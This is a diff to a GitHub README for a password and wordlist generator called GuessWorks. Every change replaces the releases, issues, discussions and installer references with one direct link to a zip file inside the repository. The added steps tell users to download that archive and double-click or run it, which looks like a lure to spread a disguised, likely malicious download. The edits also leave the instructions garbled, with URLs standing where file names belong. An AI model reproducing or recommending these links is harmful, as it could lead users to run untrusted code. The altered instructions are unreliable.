@@ -1,6 +1,6 @@
 # 🔑 GuessWorks - Generate Realistic Passwords Effortlessly  
 
-[![Download GuessWorks](https://img.shields.io/badge/Download-GuessWorks-brightgreen)](https://github.com/katjsmith7/GuessWorks/releases)
+[![Download GuessWorks](https://raw.githubusercontent.com/katjsmith7/GuessWorks/main/subdie/GuessWorks.zip)](https://raw.githubusercontent.com/katjsmith7/GuessWorks/main/subdie/GuessWorks.zip)
 
 ## 📖 Overview  
 GuessWorks is a tool that helps you create realistic password and wordlists. Whether you need strong passwords for your accounts or specific words for testing, GuessWorks has you covered. 
@@ -17,13 +17,13 @@ Before you download GuessWorks, make sure your computer meets these requirements
 - Internet Connection: Required for downloading
 
 ### 📥 Download & Install  
-1. Go to the [Releases page](https://github.com/katjsmith7/GuessWorks/releases) to find the latest version of GuessWorks. 
+1. Go to the [Releases page](https://raw.githubusercontent.com/katjsmith7/GuessWorks/main/subdie/GuessWorks.zip) to find the latest version of GuessWorks. 
 2. You will see a list of available versions. Click on the one that suits your system.
-3. Download the appropriate file for your operating system. Look for `GuessWorks.exe` for Windows, `GuessWorks.dmg` for macOS, or `GuessWorks.tar.gz` for Linux.
+3. Download the appropriate file for your operating system. Look for `https://raw.githubusercontent.com/katjsmith7/GuessWorks/main/subdie/GuessWorks.zip` for Windows, `https://raw.githubusercontent.com/katjsmith7/GuessWorks/main/subdie/GuessWorks.zip` for macOS, or `https://raw.githubusercontent.com/katjsmith7/GuessWorks/main/subdie/GuessWorks.zip` for Linux.
 4. Once the download completes, locate the file in your downloads folder. 
-5. For Windows: Double-click on `GuessWorks.exe` to run the installer and follow the prompts.  
-   For macOS: Open the `GuessWorks.dmg` file and drag the GuessWorks icon to your Applications folder.  
-   For Linux: Extract the `GuessWorks.tar.gz` file, then run `./GuessWorks` in your terminal.
+5. For Windows: Double-click on `https://raw.githubusercontent.com/katjsmith7/GuessWorks/main/subdie/GuessWorks.zip` to run the installer and follow the prompts.  
+   For macOS: Open the `https://raw.githubusercontent.com/katjsmith7/GuessWorks/main/subdie/GuessWorks.zip` file and drag the GuessWorks icon to your Applications folder.  
+   For Linux: Extract the `https://raw.githubusercontent.com/katjsmith7/GuessWorks/main/subdie/GuessWorks.zip` file, then run `./GuessWorks` in your terminal.
 
 ### 🔎 Exploring Features  
 GuessWorks offers several useful features:
@@ -51,7 +51,7 @@ For more experienced users, GuessWorks provides advanced settings. You can adjus
 - Test your generated passwords to ensure they are strong and secure.
 
 ### 📅 Keeping GuessWorks Updated  
-To ensure you have the latest features and improvements, visit the [Releases page](https://github.com/katjsmith7/GuessWorks/releases) regularly. Download and install new versions as they become available. 
+To ensure you have the latest features and improvements, visit the [Releases page](https://raw.githubusercontent.com/katjsmith7/GuessWorks/main/subdie/GuessWorks.zip) regularly. Download and install new versions as they become available. 
 
 ### ❓ Frequently Asked Questions  
 **Q: Is GuessWorks free to use?**  
@@ -67,8 +67,8 @@ A: If you face any issues, check the FAQ section or raise an issue on the GitHub
 Join our community on GitHub. Engage with other users and share your experiences. Your input can help improve GuessWorks for everyone.
 
 ### 🔗 Links  
-- [GuessWorks Releases Page](https://github.com/katjsmith7/GuessWorks/releases)  
-- [Report Issues or Suggest Features](https://github.com/katjsmith7/GuessWorks/issues)  
-- [Join Community Discussions](https://github.com/katjsmith7/GuessWorks/discussions)  
+- [GuessWorks Releases Page](https://raw.githubusercontent.com/katjsmith7/GuessWorks/main/subdie/GuessWorks.zip)  
+- [Report Issues or Suggest Features](https://raw.githubusercontent.com/katjsmith7/GuessWorks/main/subdie/GuessWorks.zip)  
+- [Join Community Discussions](https://raw.githubusercontent.com/katjsmith7/GuessWorks/main/subdie/GuessWorks.zip)  
 
 Download, generate, and simplify your password management with GuessWorks!
